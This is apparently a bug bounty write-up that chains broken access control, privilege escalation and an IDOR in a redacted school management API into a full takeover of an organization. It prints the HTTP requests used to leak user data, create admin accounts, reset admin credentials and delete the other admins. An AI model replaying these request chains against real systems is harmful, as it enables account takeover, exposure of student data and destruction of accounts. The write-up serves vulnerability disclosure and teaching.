---
title: "Taking Over an Entire Organization - A Journey Through Multiple Bugs"
datePublished: Mon Jun 12 2023 15:36:47 GMT+0000 (Coordinated Universal Time)
cuid: clit0ovif000p09l7gv5shskj
slug: taking-over-an-entire-organization
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1686584109939/d21a2887-3fa1-4e1b-b4d5-a347212a4960.jpeg
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1686584167263/413b0100-0fb7-47d6-b751-17710af05b26.jpeg
tags: hacking, hackernews, penetration-testing, bugbounty, bugbountytips

---

## **Introduction**

Today, I want to share a thrilling adventure, a tale of how a few seemingly harmless bugs can snowball into a security nightmare. Through collaborative work with my friend [DreyAnd](https://twitter.com/dreyand_) back in **April 2023,** we managed to expose vulnerabilities that eventually led to a **total organizational takeover.**

## **The Discovery**

Our journey began with an application we were testing - a school management platform designed to enable teachers and managers to control classes, students, examinations, and other resources. The platform boasted a substantial user base of students.

The first issue we spotted was that we needed a way to leak all the data and UUIDs of these numerous students.

Surprisingly, the first bug was found in a place where most would feel secure - the `admin` endpoint. Despite the endpoint itself being inaccessible, we discovered a **Broken Access Control** mechanism under this admin endpoint. Although it should have been locked behind administrative privileges, a properly formatted backend request allowed us to leak a vast amount of user data. This included information from students, teachers, and even admins.

By simply sending a `GET` request to the `/v1/admin/<organization>/customers/getUsers?=*` endpoint, we were able to gather:

* Usernames
    
* User ID
    
* Email Address
    
* Hostname
    
* IP Address
    
* Account Expiration
    

```http
GET /v1/admin/<organization>/customers/getUsers?=* HTTP/2
Host: api.redacted.com
Accept: */*
Content-Type: application/json
Authorization: Basic <low permission user auth>
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

[
  {
    "account_id": "<userid>",
    "avatar_url": "https://api.redacted.com/v2/avatar/?id=1234567",
    "first_name": "Hacker ",
    "last_name": "Admin1",
    "title": "",
    "role": "Administrator",
    "devices": [],
    "email": "hackeradmin@redacted.com",
    "username": "hackeradmin1337",
    "external_person_key": "1234567",
    "end_date": "2027-07-25T00:00:00",
      "last_session": {
        "broadcast_id": "1234-1234-1234-1234-1234ge321",
        "account_id": "<userid>",
        "created": "2027-02-27T17:56:27.4194925",
        "completed": "2027-02-27T17:57:34.0976831",
        "satellite_server_id": 123456,
        "IP": "<IP>",
        "roster_id": 12345,
        "customer_id": "<userid>",
      },
      "created_by": "<creatorid>",
      "roster_id": 54321,
      "name": "creator"
    },
    "schools": [
      {
        "school_id": "<ID>",
        "school_code": "<CODE>",
        "name": "school"
      }
  ]
```

This was our first red flag. Despite being a low-privilege account, we could fetch all the UUIDs we needed for an attack.

Next, we observed that while these **low-privilege accounts could not create admin accounts**, they could, quite strangely, **create manager accounts** which allowed us to do a vertical **Privilege Escalation**.

```http
POST /v1/<organization>/users HTTP/2
Host: api.redacted.com
Accept: */*
Content-Type: application/json
Authorization: Basic <low permission user auth>
Origin: https://www.redacted.com

{
  "first_name": "drey",
  "last_name": "ahnd",
  "username": "DreyAnd",
  "external_person_key": "",
  "email": "hacktus+5@wearehackerone.com",
  "role": "Manager",
  "schools": [
    "<ID>"
  ],
  "password": "Password",
}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 22
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

{"account_id":<ManagerID>}
```

This was our second clue that things were not quite right.

Our journey didn't stop at the manager level. We sought to determine whether we could escalate our privileges even further to obtain `admin` status. If we could go from a `low-privilege` account to a manager account, what was stopping us from becoming admins?

We discovered two significant bugs that allowed us to elevate our permissions.

The first was a **Privilege Escalation** bug that let us modify our own permissions - the same technique we had used with the `low-privilege` account - and upgrade to an `admin`.

```http
POST /v1/<organization>/users HTTP/2
Host: api.redacted.com
Accept: */*
Content-Type: application/json
Authorization: Basic <manager auth>
Origin: https://www.redacted.com

{
  "first_name": "Hacker",
  "last_name": "Admin",
  "username": "hacktus",
  "external_person_key": "",
  "email": "hacktus@wearehackerone.com",
  "role": "Administrator",
  "schools": [
    "<ID>"
  ],
  "password": "Password",
}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 22
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

{"account_id":<AdminID>}
```

The second bug was an **Insecure Direct Object Reference (IDOR)** that let us modify the data of any existing `admin` account - specifically the email and password. With this capability, we could essentially take over any admin account within the organization.

```http
PUT /v1/<organization>/users/<adminid> HTTP/2
Host: api.redacted.com
Content-Length: 339
Accept: */*
Content-Type: application/json
Authorization: Basic <admin auth>

[
    {
        "first_name": "tookover",
        "last_name": "by manager",
        "username": "admin",
        "external_person_key": "",
        "email": "test@redacted.com",
        "role": "Administrator",
        "schools": [
            "<ID>"
        ],
        "password": "NewPassword",
    }
]
```

With these newfound bugs, we had effectively breached the heart of the administrative sphere.

## **The Impact**

What came next was something we didn't initially foresee. Using the admin access we had just secured, we managed to delete all other admin accounts, effectively taking over the entire organization.

```http
DELETE /v1/<organization>/users/<userid> HTTP/2
Host: api.redacted.com
Accept: */*
Content-Type: application/json
Authorization: Basic <admin auth>
```

Our findings demonstrated the massive impact of these bugs. The organization's integrity was at risk due to the snowballing effect of several vulnerabilities that, individually, may not have appeared as critical threats.

## **Conclusion**

In this journey of discovery, we've learned how crucial it is to understand the implications of seemingly insignificant bugs. More importantly, we have demonstrated how a chain of these bugs can potentially lead to a full organizational takeover.

In the ever-evolving landscape of cybersecurity, there's never been a more important time to ensure the safety of our digital spaces. Remember - when it comes to security, every bug counts, no matter how small it may seem.

*Happy hacking and stay secure!*